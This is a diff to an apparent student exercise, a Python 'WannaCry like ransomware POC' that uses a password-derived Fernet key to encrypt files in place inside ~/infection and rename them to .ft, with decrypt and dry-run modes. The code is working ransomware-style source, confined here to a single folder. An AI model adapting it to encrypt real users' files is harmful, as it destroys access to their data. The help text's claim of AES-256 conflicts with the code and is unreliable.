@@ -1,8 +1,12 @@
 #!/usr/bin/env python3
 
 import os
+import base64
 import argparse
-from Crypto.Cipher import AES
+
+from cryptography.fernet import Fernet
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
 
 __version__ = '0.1'
 __author__ = 'tischmid@student.42berlin.de'
@@ -19,6 +23,7 @@ The above copyright notice and this permission notice shall be included in all c
 THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 '''
 SILENT = False
+DRY_RUN = False
 WANNACRY_EXTENSIONS = {'.wnry', '.wcry', '.wncry', '.wncryt'}
 
 def log(msg: str, level: str = 'INFO', force_print=False) -> None:
@@ -34,23 +39,52 @@ def log(msg: str, level: str = 'INFO', force_print=False) -> None:
             clr = '32'
         print(f'\033[{clr}m{level}: {msg}\033[m')
 
-def encrypt_file(file_path: str, key: str):
-    print(f'Encrypting file "{file_path}" with key "{key}"')
+def encrypt_file(file_path: str, f) -> None:
+    if DRY_RUN:
+        log(f'DRY RUN: Encrypting file "{file_path}"', 'INFO')
+        return
+    else:
+        log(f'Encrypting file "{file_path}"', 'INFO')
+    with open(file_path, 'rb') as orig_file:
+        try:
+            cipher = f.encrypt(orig_file.read())
+        except Exception as e:
+            log(f'An error occured encrypting file "{file_path}": {e}', 'WARNING')
+            return
+    with open(file_path, 'wb') as encrypted_file:
+        encrypted_file.write(cipher)
+    os.rename(file_path, file_path + '.ft')
 
-def decrypt_file(file_path: str, key: str):
-    print(f'Decrypting file "{file_path}" with key "{key}"')
+def decrypt_file(file_path: str, f) -> None:
+    if DRY_RUN:
+        log(f'DRY RUN: Decrypting file "{file_path}"', 'INFO')
+        return
+    else:
+        log(f'Decrypting file "{file_path}"', 'INFO')
+    if not file_path.endswith('.ft'):
+        log(f'File "{file_path}" doesn\'t end with ".ft"', 'WARNING')
+        return
+    with open(file_path, 'rb') as encrypted_file:
+        try:
+            plaintext = f.decrypt(encrypted_file.read())
+        except Exception as e:
+            log(f'An error occured decrypting file "{file_path}": {e}', 'WARNING')
+            return
+    with open(file_path, 'wb') as decrypted_file:
+        decrypted_file.write(plaintext)
+    os.rename(file_path, file_path.removesuffix('.ft'))
 
 if __name__ == '__main__':
     parser = argparse.ArgumentParser(
         prog='stockholm',
         description='WannaCry like ransomware POC - run at your own risk',
-        usage='%(prog)s [options] <key>',
+        usage='%(prog)s [options] <password>',
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog='''\
 IMPORTANT NOTICE:
 Running this program will ENCRYPT (or decrypt if -r/--reverse is specified) ALL REGULAR FILES ENDING IN
 `.wnry', `.wcry', `.wncry', `.wncryt' in the folder called `infection' inside the HOME directory of
-the user whose UID is the same as the REAL UID that is running this program, using AES-256-CBC with KEY
+the user whose UID is the same as the REAL UID that is running this program, using AES-256-CBC with <password>
 E.g.:
     - $ $(prog)s      will encrypt files in ~/infection,
     - $ sudo $(prog)s will encrypt files in ~root/infection,
@@ -59,28 +93,39 @@ E.g.:
         '''
     )
 
-    parser.add_argument('key', help='The 16 character (or more) key used for encryption or decryption')
+    parser.add_argument('password', help='The 16 character (or more) password used for encryption or decryption')
     parser.add_argument('-v', '--version', action='version', version=f'%(prog)s {__version__}')
-    parser.add_argument('-r', '--reverse', action='store_true', help='Decrypt files using KEY (instead of encrypting)')
+    parser.add_argument('-r', '--reverse', action='store_true', help='Decrypt files using <password> (instead of encrypting)')
     parser.add_argument('-s', '--silent', action='store_true', help='Do not print which files were encrypted/decrypted')
+    parser.add_argument('-u', '--dry-run', action='store_true', help='Do not encrypt/decrypt, just print what would be done')
     args = parser.parse_args()
 
     SILENT = args.silent
-    key = args.key
-    if len(key) < 16:
-        log(f'Key "{key}" must be at least 16 characters', 'ERROR', force_print=True)
+    DRY_RUN = args.dry_run
+    password = args.password
+    if len(password) < 16:
+        log(f'Password "{password}" must be at least 16 characters', 'ERROR', force_print=True)
         raise SystemExit(1)
     users_home = os.path.expanduser('~')
     crypt_path = os.path.join(users_home, 'infection')
     if not os.path.isdir(crypt_path):
         log(f'Directory "{crypt_path}" does not exist', 'ERROR', force_print=True)
         raise SystemExit(1)
+    kdf = PBKDF2HMAC(
+        algorithm=hashes.SHA256(),
+        length=32,
+        salt=b'static',
+        iterations=100000
+    )
+    key = base64.urlsafe_b64encode(kdf.derive(password.encode('utf-8')))
+    f = Fernet(key) # AES-128-CBC, PKCS7 padding
     for root, dirs, files in os.walk(crypt_path):
         for file in files:
             file_path = os.path.join(root, file)
             if os.path.isfile(file_path):
-                if file_path.endswith(tuple(WANNACRY_EXTENSIONS)):
-                    if args.reverse:
-                        decrypt_file(file_path, key)
-                    else:
-                        encrypt_file(file_path, key)
+                if args.reverse:
+                    if file_path.endswith('.ft'):
+                        decrypt_file(file_path, f)
+                else:
+                    if file_path.endswith(tuple(WANNACRY_EXTENSIONS)):
+                        encrypt_file(file_path, f)
